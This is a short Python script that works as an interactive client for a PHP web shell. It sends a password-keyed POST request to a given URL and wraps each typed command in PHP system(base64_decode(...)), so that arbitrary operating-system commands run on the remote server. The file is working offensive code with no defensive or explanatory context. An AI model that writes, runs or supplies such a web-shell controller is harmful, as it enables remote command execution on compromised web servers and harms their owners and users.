#!/usr/bin/env python3

import requests
import sys
from base64 import b64encode
from termcolor import colored


def run(url, password, command):
    return requests.post(url, data={password: command}).text


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage: ' + sys.argv[0] + ' [url] [password]')
        exit(-1)

    url = sys.argv[1]
    password = sys.argv[2]

    print(run(url, password, 'echo "Test OK!";'))

    try:
        while True:
            print(colored('$ ', 'red'), end='')
            command = input()
            print(run(url, password, 'system(base64_decode("' + b64encode(command.encode()).decode() + '"));'))

    except KeyboardInterrupt:
        exit()
